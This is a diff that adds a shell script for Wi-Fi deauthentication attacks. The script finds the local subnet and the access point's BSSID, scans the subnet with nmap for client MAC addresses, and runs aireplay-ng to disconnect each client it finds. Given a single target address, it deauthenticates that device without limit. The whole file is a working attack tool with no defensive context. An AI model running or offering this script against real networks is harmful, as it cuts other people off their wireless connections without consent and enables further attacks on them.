@@ -1,0 +1,44 @@
+#!/bin/sh
+
+if [ ! "$SUDO_USER" ]; then
+	echo "Run as it root"
+	exit
+fi
+
+ifconfig wlan1 up >/dev/null 2>&1
+
+if [ ! "`ifconfig | grep wlan1`" ]; then
+	echo "wlan1 is not exists"
+	exit
+fi
+
+ifconfig wlan1 down
+
+
+myip=`ifconfig | grep -e "inet 192.168." -e "inet 172.16." -e "inet 10." | grep -v ".44.111" | grep -v ".168.168." | awk '{print $2}'`
+mynet=`echo $myip | awk -F "." '{print $1"."$2"."$3".0/24"}'`
+echo SOURCE IP: $myip
+
+apmac=`iwconfig 2>/dev/null | grep Access | grep -v Not | sed -n 1p | awk '{print $6}'`
+
+if [ "$1" ]; then
+	echo TARGET ADDRESS: $1
+	aireplay-ng --ignore-negative-one -0 0 -a $apmac -c $1 wlan1
+	exit
+fi
+
+echo TARGET NETWOTK: $mynet
+echo TARGET BSSID: $apmac
+echo SEARCH...
+
+tar=`nmap -sn $mynet | grep MAC | grep -v "$apmac" | awk '{print $3}'`
+
+if [ "$apmac" ]; then
+	while read line
+	do
+		aireplay-ng --ignore-negative-one -0 20 -a $apmac -c $line wlan1
+	done <<EOL
+$tar
+EOL
+fi
+
